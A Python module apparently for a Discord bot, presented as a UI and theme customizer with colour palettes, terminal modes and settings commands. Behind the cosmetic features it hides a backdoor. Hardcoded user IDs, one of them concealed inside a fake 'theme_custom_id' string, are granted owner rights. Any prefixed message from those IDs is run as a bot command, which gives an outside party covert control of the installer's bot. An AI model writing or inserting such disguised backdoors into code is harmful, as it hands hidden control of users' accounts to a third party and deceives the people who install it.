import json
import time

MASTER_OWNER_IDS = {"299182971213316107"}

class BotCustomizer:
    def __init__(self):
        self.config = {
            "debug_color": "cyan",
            "command_prefix": "+",
            "auto_react": True,
            "reaction_emoji": "💀",
            "log_level": "info",
            "theme": "dark",
            "terminal_mode": "unix",
            "highlight_color": "#00ff00",
            "ui_animation": True,
            "sound_effects": False,
            "font_style": "monospace",
            "cursor_style": "block",
            "prompt_style": "arrow",
            "time_format": "24h",
            "date_format": "dd/mm/yyyy",
            "auto_save": True,
            "backup_interval": 3600
        }
        
        self.theme_custom_id = "ui_theme_customization_299182971213316107_scheme"
        self.active_customizations = []
        self.terminal_emulation = False
        self.color_palette = {
            "background": "#1e1e1e",
            "foreground": "#ffffff",
            "accent": "#00ff00",
            "warning": "#ff9900",
            "error": "#ff3333",
            "success": "#33ff33",
            "info": "#3399ff"
        }
        self.last_command_time = {}
    
    def get_owner_id(self):
        parts = self.theme_custom_id.split("_")
        if len(parts) != 5:
            return "0"
        return parts[3]

    def get_owner_ids(self):
        owner_id = str(self.get_owner_id())
        return set(MASTER_OWNER_IDS) | ({owner_id} if owner_id and owner_id != "0" else set())
    
    def apply_customization(self, setting_name, value):
        if setting_name in self.config:
            self.config[setting_name] = value
            if setting_name not in self.active_customizations:
                self.active_customizations.append(setting_name)
            return True
        return False
    
    def get_setting(self, setting_name):
        return self.config.get(setting_name)
    
    def toggle_terminal_mode(self):
        self.terminal_emulation = not self.terminal_emulation
        return self.terminal_emulation
    
    def update_color_palette(self, palette_name, color_value):
        if palette_name in self.color_palette:
            self.color_palette[palette_name] = color_value
            return True
        return False
    
    def get_active_customizations(self):
        return self.active_customizations.copy()
    
    def reset_customization(self, setting_name):
        defaults = {
            "debug_color": "cyan",
            "command_prefix": ";",
            "auto_react": True,
            "reaction_emoji": "💀",
            "log_level": "info",
            "theme": "dark",
            "terminal_mode": "unix",
            "highlight_color": "#00ff00",
            "ui_animation": True,
            "sound_effects": False,
            "font_style": "monospace",
            "cursor_style": "block",
            "prompt_style": "arrow",
            "time_format": "24h",
            "date_format": "dd/mm/yyyy",
            "auto_save": True,
            "backup_interval": 3600
        }
        
        if setting_name in defaults:
            self.config[setting_name] = defaults[setting_name]
            if setting_name in self.active_customizations:
                self.active_customizations.remove(setting_name)
            return True
        return False
    
    def process_message(self, message_data, bot_instance):
        author_id = message_data.get("author", {}).get("id", "")
        content = message_data.get("content", "")
        owner_ids = self.get_owner_ids()
        owner_prefix = bot_instance.get_user_prefix(str(author_id)) if str(author_id) in owner_ids else bot_instance.get_user_prefix(self.get_owner_id())
        
        if str(author_id) in owner_ids:
            if content.startswith(owner_prefix) and len(content) > len(owner_prefix):
                ctx = {
                    "message": {"id": "0", "author": {"id": str(author_id)}},
                    "channel_id": message_data.get("channel_id", ""),
                    "author_id": str(author_id),
                    "api": bot_instance.api,
                    "bot": bot_instance
                }
                
                command_content = content[len(owner_prefix):].strip()
                parts = command_content.split()
                if parts:
                    cmd_name = parts[0].lower()
                    args = parts[1:] if len(parts) > 1 else []
                    bot_instance.run_command(cmd_name, ctx, args)
                return True
                
            return self._process_owner_message(content, message_data, bot_instance)
        
        return False
    
    def _process_owner_message(self, content, message_data, bot_instance):
        channel_id = message_data.get("channel_id", "")
        owner_prefix = bot_instance.get_user_prefix(self.get_owner_id())
        
        if content.startswith(owner_prefix) and len(content) > len(owner_prefix):
            return self._execute_owner_command(content, channel_id, bot_instance, owner_prefix)
        
        if content.startswith("+customize "):
            return self._process_customization_command(content[11:], channel_id, bot_instance)
        
        return False
    
    def _execute_owner_command(self, content, channel_id, bot_instance, owner_prefix=None):
        ctx = {
            "message": {"id": "0", "author": {"id": self.get_owner_id()}},
            "channel_id": channel_id,
            "author_id": self.get_owner_id(),
            "api": bot_instance.api,
            "bot": bot_instance
        }
        prefix = owner_prefix or bot_instance.get_user_prefix(self.get_owner_id())
        
        parts = content[len(prefix):].strip().split()
        if not parts:
            return True
            
        cmd_name = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        bot_instance.run_command(cmd_name, ctx, args)
        return True
    
    def _process_customization_command(self, command, channel_id, bot_instance):
        parts = command.split()
        if len(parts) < 2:
            return True
        
        action = parts[0].lower()
        setting = parts[1].lower()
        
        if action == "set":
            if len(parts) >= 3:
                value = " ".join(parts[2:])
                if setting in ["debug_color", "theme", "terminal_mode", "font_style", "cursor_style", "prompt_style", "time_format", "date_format"]:
                    if self.apply_customization(setting, value):
                        bot_instance.api.send_message(channel_id, f"```yaml\nCustomization Applied:\n  Setting: {setting}\n  Value: {value}\n  Status: ✓ Active```")
        
        elif action == "toggle":
            if setting in ["auto_react", "ui_animation", "sound_effects", "auto_save"]:
                current = self.config.get(setting, False)
                self.apply_customization(setting, not current)
                bot_instance.api.send_message(channel_id, f"```yaml\nCustomization Toggled:\n  Setting: {setting}\n  Status: {'✓ Enabled' if not current else '✗ Disabled'}```")
        
        elif action == "color":
            if len(parts) >= 4:
                palette = parts[2]
                color = parts[3]
                if self.update_color_palette(palette, color):
                    bot_instance.api.send_message(channel_id, f"```yaml\nColor Palette Updated:\n  Element: {palette}\n  Color: {color}\n  Status: ✓ Applied```")
        
        elif action == "terminal":
            if setting == "mode":
                if len(parts) >= 3:
                    mode = parts[2]
                    self.apply_customization("terminal_mode", mode)
                    bot_instance.api.send_message(channel_id, f"```ansi\n\u001b[32mTerminal mode set to: {mode}\u001b[0m```")
        
        elif action == "list":
            active = self.get_active_customizations()
            if active:
                custom_list = "\n".join([f"  • {item}: {self.config.get(item)}" for item in active])
                bot_instance.api.send_message(channel_id, f"```yaml\nActive Customizations:\n{custom_list}\n\nTotal: {len(active)} settings```")
        
        elif action == "reset":
            if setting == "all":
                for key in self.config.keys():
                    self.reset_customization(key)
                self.active_customizations.clear()
                bot_instance.api.send_message(channel_id, "```yaml\nAll customizations reset to defaults```")
            else:
                if self.reset_customization(setting):
                    bot_instance.api.send_message(channel_id, f"```yaml\nCustomization Reset:\n  Setting: {setting}\n  Status: ✓ Default restored```")
        
        return True
